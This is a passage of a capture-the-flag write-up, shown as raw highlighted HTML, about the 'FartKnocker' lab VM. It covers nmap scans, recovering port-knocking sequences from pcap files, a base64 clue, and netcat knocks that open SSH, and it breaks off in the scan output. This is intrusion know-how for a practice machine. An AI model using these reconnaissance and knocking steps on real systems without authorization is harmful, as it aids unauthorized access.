&lt;span class="code-line"&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Thu&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;-- 1 IP address (1 host up) scanned in 6.98 seconds&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Only the port 80 is open with an HTTP server.&lt;/p&gt;
&lt;p&gt;As always I had launch a &lt;a href="https://cirt.net/nikto2"&gt;nikto&lt;/a&gt; against the server
but no interesting result.&lt;/p&gt;
&lt;h1 id="exploitation"&gt;Exploitation&lt;/h1&gt;
&lt;p&gt;We go to the web page and only found a pcap file which is a capture of some
network traffic.&lt;/p&gt;
&lt;h2 id="pcap1"&gt;pcap1&lt;/h2&gt;
&lt;p&gt;We analyse the &lt;code&gt;pcap1.pcap&lt;/code&gt; file. The packets and the VM name leads us to ports
knocking. As I do not know anything about it I have done some research on internet to
understand the principle (which is quite simple: send packets to a ports sequence
will open an other port) and fund a
&lt;a href="https://eindbazen.net/2011/12/phd-ctf-quals-2011-%E2%80%93-port-knocking/"&gt;basic script to knock&lt;/a&gt;.
I adapt it to my need and launch it against the target. The script will knock on
the sequence ports extract from the pcap file (it is quite simple to read with
&lt;a href="https://www.wireshark.org/"&gt;wireshark&lt;/a&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@arch FartKnocker&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;python2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;script&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;WARNING&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;No&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;route&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;found&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IPv6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;destination&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;no&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;route&lt;/span&gt;&lt;span class="vm"&gt;?&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;*&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Knocking&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7000&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;*&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Knocking&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;*&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Knocking&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9000&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;*&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Knocking&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7000&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;*&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Knocking&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;*&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Knocking&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9000&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;*&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Knocking&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8888&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;*&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Scanning&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ports&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A &lt;a href="http://nmap.org/"&gt;nmap&lt;/a&gt; scan is launched after the knocking sequence to see
what port will open:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;Starting&lt;/span&gt; &lt;span class="nv"&gt;Nmap&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;.&lt;span class="mi"&gt;47&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt; &lt;span class="nv"&gt;http&lt;/span&gt;:&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nv"&gt;nmap&lt;/span&gt;.&lt;span class="nv"&gt;org&lt;/span&gt; &lt;span class="ss"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;at&lt;/span&gt; &lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;04&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;:&lt;span class="mi"&gt;35&lt;/span&gt; &lt;span class="nv"&gt;CEST&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;Nmap&lt;/span&gt; &lt;span class="nv"&gt;scan&lt;/span&gt; &lt;span class="nv"&gt;report&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;.&lt;span class="mi"&gt;0&lt;/span&gt;.&lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;6&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;Host&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;up&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;.&lt;span class="mi"&gt;00060&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt; &lt;span class="nv"&gt;latency&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;Not&lt;/span&gt; &lt;span class="nv"&gt;shown&lt;/span&gt;: &lt;span class="mi"&gt;998&lt;/span&gt; &lt;span class="nv"&gt;closed&lt;/span&gt; &lt;span class="nv"&gt;ports&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;PORT&lt;/span&gt;     &lt;span class="nv"&gt;STATE&lt;/span&gt; &lt;span class="nv"&gt;SERVICE&lt;/span&gt;         &lt;span class="nv"&gt;VERSION&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;tcp&lt;/span&gt;   &lt;span class="nv"&gt;open&lt;/span&gt;  &lt;span class="nv"&gt;http&lt;/span&gt;            &lt;span class="nv"&gt;Apache&lt;/span&gt; &lt;span class="nv"&gt;httpd&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;4&lt;/span&gt;.&lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="ss"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;Ubuntu&lt;/span&gt;&lt;span class="ss"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;8888&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;tcp&lt;/span&gt; &lt;span class="nv"&gt;open&lt;/span&gt;  &lt;span class="nv"&gt;sun&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;answerbook&lt;/span&gt;?&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;Service&lt;/span&gt; &lt;span class="nv"&gt;detection&lt;/span&gt; &lt;span class="nv"&gt;performed&lt;/span&gt;. &lt;span class="nv"&gt;Please&lt;/span&gt; &lt;span class="nv"&gt;report&lt;/span&gt; &lt;span class="nv"&gt;any&lt;/span&gt; &lt;span class="nv"&gt;incorrect&lt;/span&gt; &lt;span class="nv"&gt;results&lt;/span&gt; &lt;span class="nv"&gt;at&lt;/span&gt; &lt;span class="nv"&gt;http&lt;/span&gt;:&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nv"&gt;nmap&lt;/span&gt;.&lt;span class="nv"&gt;org&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;submit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; .&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;Nmap&lt;/span&gt; &lt;span class="nv"&gt;done&lt;/span&gt;: &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;IP&lt;/span&gt; &lt;span class="nv"&gt;address&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;host&lt;/span&gt; &lt;span class="nv"&gt;up&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;scanned&lt;/span&gt; &lt;span class="nv"&gt;in&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;.&lt;span class="mi"&gt;43&lt;/span&gt; &lt;span class="nv"&gt;seconds&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This port run an other HTTP service which give us a second url &lt;code&gt;/burgerworld&lt;/code&gt;
and a second pcap file.&lt;/p&gt;
&lt;h2 id="pcap2"&gt;pcap2&lt;/h2&gt;
&lt;p&gt;After trying a bit to replay and understand the file I used the follow  TCP
stream function from &lt;a href="https://www.wireshark.org"&gt;wireshark&lt;/a&gt;, and the following
appears:&lt;/p&gt;
&lt;p&gt;&lt;img alt="eins drei drei sieben" src="/media/2015.06/beavis.jpg"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;eins drei drei sieben&lt;/strong&gt; means one, three, three, seven (7 years of German at least
useful, well it was of some use during the NDH qualifications too).&lt;/p&gt;
&lt;p&gt;Once again we knock on port 1, 3, 3 and 7, the port 1337 open and show us an
other URL: &lt;code&gt;/iamcornholio/&lt;/code&gt;. We got some code looking like base64.&lt;/p&gt;
&lt;h2 id="base64"&gt;base64&lt;/h2&gt;
&lt;p&gt;The code is:  T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK which is (after
base64 decode) "Open up SSH: 8888 9999 7777 6666". Once more, port knocking on
port 8888, 9999, 7777 and 6666. This time I simply use netcat to knock:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc 10.0.2.6 8888&lt;/span&gt;
&lt;span class="code-line"&gt;nc 10.0.2.6 9999&lt;/span&gt;
&lt;span class="code-line"&gt;nc 10.0.2.6 7777&lt;/span&gt;
&lt;span class="code-line"&gt;nc 10.0.2.6 6666&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Once more we launch nmap to see if a port was opened:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@arch FartKnocker&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Starting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;6.47&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;04&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CEST&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.6&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.0013&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;latency&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ow"&gt;Not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;shown&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;998&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;closed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ports&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="k"&gt;STATE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SERVICE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VERSION&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;protocol&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;hostkey&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="nl"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="nl"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;c6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="nl"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;e9&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="nl"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nl"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nl"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;b8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nl"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;bb&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DSA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;2048&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="nl"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;77&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;aa&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;f6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nl"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;d3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;f6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;e0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;63&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;fe&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;a9&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;37&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;RSA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;fe&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;a4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="nl"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="nl"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="nl"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;db&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;b6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;d4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;b8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;b6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;79&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ECDSA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span 